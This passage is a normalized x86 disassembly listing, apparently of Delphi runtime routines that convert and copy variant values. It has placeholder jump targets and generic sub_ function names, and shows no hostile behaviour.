lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_408240
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_403fc0
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0xc ]
call sub_409684
mov edx [ ebp - 0xc ]
mov eax esi
call sub_403fc0
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x10 ]
call sub_409684
mov edx [ ebp - 0x10 ]
mov eax esi
call sub_403fc0
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x14 ]
call sub_41241c
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_4041f4
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x18 ]
call sub_412454
mov edx [ ebp - 0x18 ]
mov eax esi
call sub_4041f4
jmp r-xdata
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x20 ]
mov edx [ ebx + 0x8 ]
call sub_404788
mov eax [ ebp - 0x20 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_404874
mov edx [ ebp - 0x1c ]
mov eax esi
call sub_4041f4
jmp r-xdata
lea edx [ ebp - 0x24 ]
mov ax [ ebx + 0x8 ]
call sub_41248c
mov edx [ ebp - 0x24 ]
mov eax esi
call sub_4041f4
jmp r-xdata
lea edx [ ebp - 0x28 ]
movsx eax [ ebx + 0x8 ]
call sub_408240
mov edx [ ebp - 0x28 ]
mov eax esi
call sub_403fc0
jmp r-xdata
lea edx [ ebp - 0x2c ]
xor eax eax
mov al [ ebx + 0x8 ]
call sub_408240
mov edx [ ebp - 0x2c ]
mov eax esi
call sub_403fc0
jmp r-xdata
lea edx [ ebp - 0x30 ]
movzx eax [ ebx + 0x8 ]
call sub_408240
mov edx [ ebp - 0x30 ]
mov eax esi
call sub_403fc0
jmp r-xdata
mov eax [ ebx + 0x8 ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x34 ]
call sub_40832c
mov edx [ ebp - 0x34 ]
mov eax esi
call sub_403fc0
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x38 ]
call sub_40832c
mov edx [ ebp - 0x38 ]
mov eax esi
call sub_403fc0
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_412704
jmp r-xdata
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_412550
mov edx [ ebp - 0x3c ]
mov eax esi
call sub_403fc0
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412c42
lea eax [ ebp - 0x78 ]
mov edx 0x7
call sub_403f90
lea eax [ ebp - 0x5c ]
mov edx 0x3
call sub_404690
lea eax [ ebp - 0x50 ]
mov edx 0xb
call sub_403f90
lea eax [ ebp - 0x24 ]
mov edx 0x5
call sub_404690
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403f90
retn
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_41261c
mov edx [ ebp - 0x40 ]
mov eax esi
call sub_403fc0
jmp r-xdata
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_403fc0
jmp r-xdata
mov dx 0x100
mov ax 0x1
call sub_40e990
test ah 0x40
je r-xdata
mov eax esi
call sub_403f6c
mov edx eax
mov eax ebx
call sub_412680
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
lea edx [ ebp - 0x78 ]
mov eax ebx
call sub_412550
mov edx [ ebp - 0x78 ]
mov eax esi
call sub_403fc0
lea edx [ ebp - 0x74 ]
mov eax ebx
call sub_412550
mov edx [ ebp - 0x74 ]
mov eax esi
call sub_403fc0
jmp r-xdata
jmp [ eax * 4 + jump_table_4129d1 ]
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_408240
mov edx [ ebp - 0x44 ]
mov eax esi
call sub_403fc0
jmp r-xdata
lea edx [ ebp - 0x48 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_408240
mov edx [ ebp - 0x48 ]
mov eax esi
call sub_403fc0
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x4c ]
call sub_409684
mov edx [ ebp - 0x4c ]
mov eax esi
call sub_403fc0
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x50 ]
call sub_409684
mov edx [ ebp - 0x50 ]
mov eax esi
call sub_403fc0
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x54 ]
call sub_41241c
mov edx [ ebp - 0x54 ]
mov eax esi
call sub_4041f4
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x58 ]
call sub_412454
mov edx [ ebp - 0x58 ]
mov eax esi
call sub_4041f4
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_404194
jmp r-xdata
lea edx [ ebp - 0x5c ]
mov eax [ ebx + 0x8 ]
mov ax [ eax ]
call sub_41248c
mov edx [ ebp - 0x5c ]
mov eax esi
call sub_4041f4
jmp r-xdata
lea edx [ ebp - 0x60 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_408240
mov edx [ ebp - 0x60 ]
mov eax esi
call sub_403fc0
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_408240
mov edx [ ebp - 0x64 ]
mov eax esi
call sub_403fc0
jmp r-xdata
lea edx [ ebp - 0x68 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_408240
mov edx [ ebp - 0x68 ]
mov eax esi
call sub_403fc0
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x6c ]
call sub_40832c
mov edx [ ebp - 0x6c ]
mov eax esi
call sub_403fc0
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x70 ]
call sub_40832c
mov edx [ ebp - 0x70 ]
mov eax esi
call sub_403fc0
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_412704
jmp r-xdata
sub_412c48
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_412cf2
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_412cd5
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
push 0x0
push 0x400
push ebx
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x8
call sub_40edd0
push esi
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_404788
mov eax [ ebp - 0x14 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_404874
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412cdc
lea eax [ ebp - 0x10 ]
call sub_40f174
retn
sub_412d00
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_412d56
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x10 ]
call sub_40f49c
lea eax [ ebp - 0x10 ]
call [ rw-data ]
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_412e2c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412d5d
lea eax [ ebp - 0x10 ]
call sub_40f174
retn
sub_412d64
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor ecx ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_412e1c
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov ax [ ebx ]
call sub_415800
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor edx edx
mov [ eax ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412e23
lea eax [ ebp - 0x20 ]
call sub_404678
retn
lea eax [ ebp - 0x1c ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_412dff
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
mov ecx ebx
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0x14 ]
call sub_404788
mov eax [ ebp - 0x20 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_404874
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x1c ]
call sub_40f174
retn
sub_412e2c
push ebp
mov ebp esp
mov ecx 0xe
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_41337e
push [ fs : eax ]
mov [ fs : eax ] esp
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_412e66 ]
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_4047c4
jmp r-xdata
dec dx
je r-xdata
mov eax esi
call sub_404678
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
movsx eax [ ebx + 0x8 ]
call sub_408240
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_4047c4
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_408240
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4047c4
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0xc ]
call sub_409684
mov edx [ ebp - 0xc ]
mov eax esi
call sub_4047c4
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x10 ]
call sub_409684
mov edx [ ebp - 0x10 ]
mov eax esi
call sub_4047c4
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x14 ]
call sub_41241c
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_4046b4
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x18 ]
call sub_412454
mov edx [ ebp - 0x18 ]
mov eax esi
call sub_4046b4
jmp r-xdata
push esi
lea eax [ ebp - 0x1c ]
mov edx [ ebx + 0x8 ]
call sub_404788
mov eax [ ebp - 0x1c ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_404874
jmp r-xdata
lea edx [ ebp - 0x20 ]
mov ax [ ebx + 0x8 ]
call sub_41248c
mov edx [ ebp - 0x20 ]
mov eax esi
call sub_4046b4
jmp r-xdata
lea edx [ ebp - 0x24 ]
movsx eax [ ebx + 0x8 ]
call sub_408240
mov edx [ ebp - 0x24 ]
mov eax esi
call sub_4047c4
jmp r-xdata
lea edx [ ebp - 0x28 ]
xor eax eax
mov al [ ebx + 0x8 ]
call sub_408240
mov edx [ ebp - 0x28 ]
mov eax esi
call sub_4047c4
jmp r-xdata
lea edx [ ebp - 0x2c ]
movzx eax [ ebx + 0x8 ]
call sub_408240
mov edx [ ebp - 0x2c ]
mov eax esi
call sub_4047c4
jmp r-xdata
mov eax [ ebx + 0x8 ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x30 ]
call sub_40832c
mov edx [ ebp - 0x30 ]
mov eax esi
call sub_4047c4
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x34 ]
call sub_40832c
mov edx [ ebp - 0x34 ]
mov eax esi
call sub_4047c4
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_412e2c
jmp r-xdata
lea edx [ ebp - 0x38 ]
mov eax ebx
call sub_412c48
mov edx [ ebp - 0x38 ]
mov eax esi
call sub_4046b4
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413385
lea eax [ ebp - 0x74 ]
mov edx 0x2
call sub_404690
lea eax [ ebp - 0x6c ]
mov edx 0x5
call sub_403f90
lea eax [ ebp - 0x58 ]
mov edx 0x3
call sub_404690
lea eax [ ebp - 0x4c ]
mov edx 0x4
call sub_403f90
lea eax [ ebp - 0x3c ]
mov edx 0x2
call sub_404690
lea eax [ ebp - 0x34 ]
mov edx 0x5
call sub_403f90
lea eax [ ebp - 0x20 ]
mov edx 0x4
call sub_404690
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403f90
retn
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_412d00
mov edx [ ebp - 0x3c ]
mov eax esi
call sub_4046b4
jmp r-xdata
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_4047c4
jmp r-xdata
mov dx 0x8
mov ax 0x1
call sub_40e990
test ah 0x40
je r-xdata
mov eax esi
call sub_404678
mov edx eax
mov eax ebx
call sub_412d64
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
lea edx [ ebp - 0x74 ]
mov eax ebx
call sub_412c48
mov edx [ ebp - 0x74 ]
mov eax esi
call sub_4046b4
lea edx [ ebp - 0x70 ]
mov eax ebx
call sub_412c48
mov edx [ ebp - 0x70 ]
mov eax esi
call sub_4046b4
jmp r-xdata
jmp [ eax * 4 + jump_table_4130ed ]
lea edx [ ebp - 0x40 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_408240
mov edx [ ebp - 0x40 ]
mov eax esi
call sub_4047c4
jmp r-xdata
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_408240
mov edx [ ebp - 0x44 ]
mov eax esi
call sub_4047c4
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x48 ]
call sub_409684
mov edx [ ebp - 0x48 ]
mov eax esi
call sub_4047c4
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x4c ]
call sub_409684
mov edx [ ebp - 0x4c ]
mov eax esi
call sub_4047c4
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x50 ]
call sub_41241c
mov edx [ ebp - 0x50 ]
mov eax esi
call sub_4046b4
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x54 ]
call sub_412454
mov edx [ ebp - 0x54 ]
mov eax esi
call sub_4046b4
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_404788
jmp r-xdata
lea edx [ ebp - 0x58 ]
mov eax [ ebx + 0x8 ]
mov ax [ eax ]
call sub_41248c
mov edx [ ebp - 0x58 ]
mov eax esi
call sub_4046b4
jmp r-xdata
lea edx [ ebp - 0x5c ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_408240
mov edx [ ebp - 0x5c ]
mov eax esi
call sub_4047c4
jmp r-xdata
lea edx [ ebp - 0x60 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_408240
mov edx [ ebp - 0x60 ]
mov eax esi
call sub_4047c4
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_408240
mov edx [ ebp - 0x64 ]
mov eax esi
call sub_4047c4
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x68 ]
call sub_40832c
mov edx [ ebp - 0x68 ]
mov eax esi
call sub_4047c4
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x6c ]
call sub_40832c
mov edx [ ebp - 0x6c ]
mov eax esi
call sub_4047c4
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_412e2c
jmp r-xdata
sub_41338c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_4133f6
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
lea eax [ ebp - 0x10 ]
call sub_40f49c
lea eax [ ebp - 0x10 ]
call [ rw-data ]
cmp [ ebp - 0x10 ] 0xd
je r-xdata
mov eax ebx
mov edx [ ebp - 0x8 ]
call sub_4059b4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4133fd
lea eax [ ebp - 0x10 ]
call sub_40f174
retn
mov dx 0xd
mov ax 0x101
call sub_40e990
sub_413404
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
movzx eax [ ebx ]
cmp eax 0xd
jg r-xdata
sub eax 0x101
je r-xdata
je r-xdata
mov edx ebx
mov eax esi
call sub_41338c
jmp r-xdata
sub eax 0x3f08
je r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_4059b4
jmp r-xdata
sub eax 0x1
jb r-xdata
pop edx
pop esi
pop ebx
retn
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_4059b4
jmp r-xdata
sub eax 0x4
je r-xdata
mov eax esi
call sub_40599c
jmp r-xdata
je r-xdata
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
sub eax 0x8
je r-xdata
mov edx esp
mov ax [ ebx ]
call sub_415800
test al al
je r-xdata
mov eax esi
call sub_40599c
jmp r-xdata
mov dx 0xd
mov ax 0x1
call sub_40e990
jmp r-xdata
mov ax [ ebx ]
mov dx 0xd
call sub_40e990
mov eax esi
call sub_40599c
mov ecx eax
mov edx r-xdata
mov eax [ esp ]
call sub_4032d0
test al al
jne r-xdata
sub_4134d0
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
mov ax [ ebx ]
sub ax 0x1
jb r-xdata
mov eax esi
call sub_40599c
jmp r-xdata
je r-xdata
pop edx
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
sub ax 0x8
je r-xdata
mov eax esi
call sub_40599c
jmp r-xdata
mov dx 0x9
mov ax 0x1
call sub_40e990
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_4059b4
jmp r-xdata
sub ax 0x4000
je r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_4059b4
jmp r-xdata
jmp r-xdata
mov edx esp
mov ax [ ebx ]
call sub_415800
test al al
je r-xdata
mov ax [ ebx ]
mov dx 0x9
call sub_40e990
mov eax esi
call sub_40599c
mov ecx eax
mov edx r-xdata
mov eax [ esp ]
call sub_4032d0
test al al
jne r-xdata
sub_41357c
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi ] 0xbfe8
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax edi
call sub_40f0f8
mov [ edi ] 0x3
movsx eax bl
mov ax [ eax * 2 + rw-data ]
mov [ edi ] ax
jmp r-xdata
mov [ edi + 0x8 ] esi
pop edi
pop esi
pop ebx
retn
sub_4135b8
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x3
mov [ ebx + 0x8 ] esi
pop esi
pop ebx
retn
mov eax ebx
call sub_40f0f8
sub_4135d8
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi ] 0xbfe8
je r-xdata
mov [ esi ] 0x11
mov [ esi + 0x8 ] bl
pop esi
pop ebx
retn
mov eax esi
call sub_40f0f8
sub_4135f8
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x12
mov [ ebx + 0x8 ] si
pop esi
pop ebx
retn
mov eax ebx
call sub_40f0f8
sub_413618
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x13
mov [ ebx + 0x8 ] esi
pop esi
pop ebx
retn
mov eax ebx
call sub_40f0f8
sub_413638
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi ] 0xbfe8
je r-xdata
mov [ esi ] 0x10
mov [ esi + 0x8 ] bl
pop esi
pop ebx
retn
mov eax esi
call sub_40f0f8
sub_413658
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x2
mov [ ebx + 0x8 ] si
pop esi
pop ebx
retn
mov eax ebx
call sub_40f0f8
sub_413678
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x14
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_40f0f8
sub_4136a4
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x4
pop ebx
pop ebp
retn 0x4
mov eax ebx
call sub_40f0f8
sub_4136c8
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx ] 0x5
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_40f0f8
sub_4136f4
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx ] 0x6
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_40f0f8
sub_413720
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx ] 0x7
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_40f0f8
sub_41374c
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi ] 0xbfe8
je r-xdata
mov [ esi ] 0xb
cmp bl 0x1
cmc
sbb eax eax
mov [ esi + 0x8 ] ax
pop esi
pop ebx
retn
mov eax esi
call sub_40f0f8
sub_4137b0
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x100
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_403fc0
pop esi
pop ebx
retn
mov eax ebx
call sub_40f0f8
sub_4137dc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41381f
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_4041d0
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4137b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413826
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
sub_41382c
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x8
lea eax [ ebx + 0x8 ]
push eax
mov ecx 0x7fffffff
mov edx 0x1
mov eax esi
call sub_404874
pop esi
pop ebx
retn
mov eax ebx
call sub_40f0f8
sub_413864
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0xd
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_4059b4
pop esi
pop ebx
retn
mov eax ebx
call sub_40f0f8
sub_413890
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x9
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_4059b4
pop esi
pop ebx
retn
mov eax ebx
call sub_40f0f8
sub_4138bc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4138ff
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_4047c4
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_41382c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413906
lea eax [ ebp - 0x4 ]
call sub_404678
retn
sub_41390c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_413962
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
lea eax [ ebp - 0x10 ]
call sub_40f49c
lea eax [ ebp - 0x10 ]
call [ rw-data ]
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_40f49c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413969
lea eax [ ebp - 0x10 ]
call sub_40f174
retn
sub_413978
push ebx
push esi
push edi
push ecx
mov ebx edx
mov esi eax
cmp [ ebx ] 0x400c
jne r-xdata
test [ esi ] 0xbfe8
je r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_413978
jmp r-xdata
mov di [ ebx ]
movzx eax di
cmp eax 0x14
jg r-xdata
mov eax esi
call sub_40f0f8
pop edx
pop edi
pop esi
pop ebx
retn
sub eax 0x100
je r-xdata
je r-xdata
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_4138bc
jmp r-xdata
dec eax
je r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
add eax 0xfffffff0
sub eax 0x3
jb r-xdata
mov edx ebx
mov eax esi
call sub_41390c
jmp r-xdata
jmp r-xdata
jg r-xdata
cmp [ ebx + 0x8 ] 0x7fffffff
ja r-xdata
mov edx ebx
mov eax esi
mov ecx 0x3
call sub_40f9e0
jmp r-xdata
je r-xdata
test di 0x2000
je r-xdata
mov edx ebx
mov eax esi
mov ecx 0x5
call sub_40f9e0
jmp r-xdata
cmp [ ebx + 0xc ] 0xffffffff
jne r-xdata
jmp r-xdata
test [ ebx + 0xb ] 0x80
je r-xdata
jmp r-xdata
mov eax edi
and ax 0xfff
cmp ax 0x10f
jae r-xdata
mov ecx sub_413970
mov edx ebx
mov eax esi
call sub_40f21c
jmp r-xdata
jl r-xdata
cmp [ ebx + 0x8 ] 0x80000000
jb r-xdata
mov edx ebx
mov eax esi
mov ecx 0x3
call sub_40f9e0
jmp r-xdata
mov edx ebx
mov eax esi
mov ecx 0x5
call sub_40f9e0
jmp r-xdata
mov edx esp
mov eax edi
call sub_415800
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_40f49c
jmp r-xdata
mov edx ebx
mov eax esi
mov ecx 0x3
call sub_40f9e0
jmp r-xdata
jmp r-xdata
call sub_40e93c
mov ecx ebx
mov edx esi
mov eax [ esp ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
jmp r-xdata
sub_413c4c
push ebp
mov ebp esp
add esp 0xfffffdf8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x208 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_413d72
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi ebx
and di 0xfff
cmp di 0x14
ja r-xdata
cmp bx 0x100
jne r-xdata
mov eax esi
movzx edx di
mov edx [ edx * 4 + rw-data ]
call sub_403fc0
jmp r-xdata
cmp bx 0x101
jne r-xdata
mov eax esi
mov edx r-xdata
call sub_403fc0
jmp r-xdata
test bh 0x20
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_415800
test al al
je r-xdata
mov eax esi
mov edx r-xdata
call sub_403fc0
jmp r-xdata
test bh 0x40
je r-xdata
mov ecx [ esi ]
mov eax esi
mov edx r-xdata
call sub_404278
lea ecx [ ebp - 0x208 ]
movzx eax di
mov edx 0x4
call sub_408354
mov ecx [ ebp - 0x208 ]
mov edx [ rw-data ]
mov edx [ edx ]
mov eax esi
call sub_404278
lea eax [ ebp - 0x104 ]
push eax
lea edx [ ebp - 0x204 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_40316c
lea eax [ ebp - 0x204 ]
mov ecx 0x7fffffff
mov edx 0x2
call sub_402924
lea edx [ ebp - 0x104 ]
mov eax esi
